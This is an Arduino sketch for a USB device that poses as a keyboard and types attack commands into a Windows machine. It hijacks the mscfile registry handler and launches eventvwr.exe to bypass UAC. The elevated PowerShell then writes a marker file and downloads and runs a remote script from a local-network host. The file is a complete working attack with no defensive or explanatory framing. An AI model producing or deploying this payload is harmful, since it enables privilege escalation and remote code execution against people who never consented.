#include<HID-Project.h>
void setup(){
  Keyboard.begin();
  delay(10000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('d');
  Keyboard.releaseAll();
  delay(100);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(100);
  Keyboard.println("powershell.exe");
  delay(500);
  Keyboard.println("New-Item -Path HKCU:\\Software\\Classes\\ -Name mscfile");
  delay(100);
  Keyboard.println("New-Item -Path HKCU:\\Software\\Classes\\mscfile\\ -Name shell");
  delay(100);
  Keyboard.println("New-Item -Path HKCU:\\Software\\Classes\\mscfile\\shell\\ -Name open");
  delay(100);
  Keyboard.println("New-Item -Path HKCU:\\Software\\Classes\\mscfile\\shell\\open\\ -Name command");
  delay(100);
  Keyboard.println("Set-ItemProperty -Path HKCU:\\Software\\Classes\\mscfile\\shell\\open\\command -Name \"(default)\" -Value 'C:\\Windows\\System32\\cmd.exe /C \"start powershell\"'");
  delay(100);
  Keyboard.println("start eventvwr.exe");
  Keyboard.println("exit");
  delay(1000);
  Keyboard.println("echo \"BYPASS UAC\" > C:\\QUACKED.txt");
  delay(100);
  Keyboard.println("iex (new-object net.webclient).downloadstring('http://192.168.1.36:8080/W1Nd0WsP0WN3D')");
  Keyboard.println("exit");
  Keyboard.end();
}

void loop(){}
